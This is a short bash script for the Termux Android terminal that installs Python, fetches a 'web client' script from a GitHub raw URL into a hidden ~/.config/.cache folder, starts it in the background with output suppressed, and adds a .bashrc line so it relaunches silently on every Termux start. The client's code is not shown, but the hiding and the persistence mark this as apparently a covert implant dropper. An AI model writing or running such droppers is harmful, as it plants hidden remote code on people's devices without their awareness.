#!/data/data/com.termux/files/usr/bin/bash
# Phase 3 Web Client Setup (Fixed)

echo "[*] Updating package lists..."
pkg update -y || { echo "[-] Failed to update."; exit 1; }

echo "[*] Installing Python and dependencies..."
pkg install -y python python-pip || { echo "[-] Failed to install Python."; exit 1; }

echo "[*] Installing required libraries..."
pip install requests || { echo "[-] Failed to install requests."; exit 1; }

REPO_URL="https://github.com/chrv01/wc1/raw/main"
CLIENT_SCRIPT="web_client.py"
HIDDEN_DIR="$HOME/.config/.cache"
BASH_RC="$HOME/.bashrc"
PYTHON_BIN="/data/data/com.termux/files/usr/bin/python"

mkdir -p "$HIDDEN_DIR"

echo "[*] Downloading web client..."
curl -sL "$REPO_URL/$CLIENT_SCRIPT" -o "$HIDDEN_DIR/$CLIENT_SCRIPT"

chmod +x "$HIDDEN_DIR/$CLIENT_SCRIPT"

# Add persistence to .bashrc using absolute Python path
PERSIST_LINE="pgrep -f \"python.*$CLIENT_SCRIPT\" > /dev/null || ($PYTHON_BIN $HIDDEN_DIR/$CLIENT_SCRIPT >/dev/null 2>&1 &)"
if ! grep -qF "$PERSIST_LINE" "$BASH_RC"; then
    echo "$PERSIST_LINE" >> "$BASH_RC"
fi

# Kill any existing client processes
pkill -f "$CLIENT_SCRIPT" 2>/dev/null || true

# Start the client immediately in the background
echo "[*] Starting client in background..."
$PYTHON_BIN "$HIDDEN_DIR/$CLIENT_SCRIPT" >/dev/null 2>&1 &

echo "[+] Setup complete. Client is now running and will auto-start on Termux launch."
